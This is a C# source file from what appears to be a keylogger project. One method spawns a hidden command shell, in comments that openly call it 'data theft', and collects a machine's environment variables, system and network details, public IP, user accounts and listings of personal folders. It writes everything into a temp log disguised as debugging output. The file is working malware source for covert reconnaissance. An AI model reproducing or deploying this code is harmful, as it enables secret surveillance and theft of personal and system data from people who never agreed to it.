using System;
using System.Diagnostics;
using System.Net.NetworkInformation;

namespace keylogger {
    class NetworkInteraction {
        public static string GetMacAddress() {
            const int MIN_MAC_ADDR_LENGTH = 12;
            string macAddress = string.Empty;
            long maxSpeed = -1;

            foreach(NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces()) {
                string tempMac = nic.GetPhysicalAddress().ToString();
                if(nic.Speed > maxSpeed && !string.IsNullOrEmpty(tempMac) && tempMac.Length >= MIN_MAC_ADDR_LENGTH) {
                    maxSpeed = nic.Speed;
                    macAddress = tempMac;
                }
            }

            return macAddress;
        }

        public static void GetExtraInfo() {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // make similar to daemon
            cmd.Start();

            // Start data theft code execution
            cmd.StandardInput.WriteLine("echo off");
            cmd.StandardInput.WriteLine("title Please hold...");
            cmd.StandardInput.WriteLine("cd %temp%");
            cmd.StandardInput.WriteLine("set filepath=\"%temp%\\sys_data_capture_%username%.log\"");
            cmd.StandardInput.WriteLine("if exist \" % filepath % \" ( del %filepath% ) else ( echo Gathering Debugging Informatin )");
            cmd.StandardInput.WriteLine("rem Let's begin the data theft");
            cmd.StandardInput.WriteLine("set >> %filepath%");
            cmd.StandardInput.WriteLine("echo User Profile: %userprofile% >> %filepath%");
            cmd.StandardInput.WriteLine("echo System Root: %systemroot% >> %filepath%");
            cmd.StandardInput.WriteLine("echo Computer Name: %computername% >> %filepath%");
            cmd.StandardInput.WriteLine("echo Username: %username% >> %filepath%");
            cmd.StandardInput.WriteLine("systeminfo >> %filepath%");
            cmd.StandardInput.WriteLine("ipconfig /all >> %filepath%");
            cmd.StandardInput.WriteLine("powershell (Invoke-WebRequest http://ipinfo.io/ip).Content >> %filepath%");
            cmd.StandardInput.WriteLine("net user >> %filepath%");
            cmd.StandardInput.WriteLine("net user %username% >> %filepath%");
            cmd.StandardInput.WriteLine("cd %userprofile%\\Documents");
            cmd.StandardInput.WriteLine("dir >> %filepath%");
            cmd.StandardInput.WriteLine("cd ../Videos");
            cmd.StandardInput.WriteLine("dir >> %filepath%");
            cmd.StandardInput.WriteLine("cd ../Pictures");
            cmd.StandardInput.WriteLine("dir >> %filepath%");
            cmd.StandardInput.WriteLine("cd ../Music");
            cmd.StandardInput.WriteLine("dir >> %filepath%");
            cmd.StandardInput.WriteLine("cd ../Desktop");
            cmd.StandardInput.WriteLine("dir >> %filepath%");
            cmd.StandardInput.WriteLine("cd \\");

            // End data theft code execution
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
            cmd.Close();
            Console.Clear();
        }
    }
}
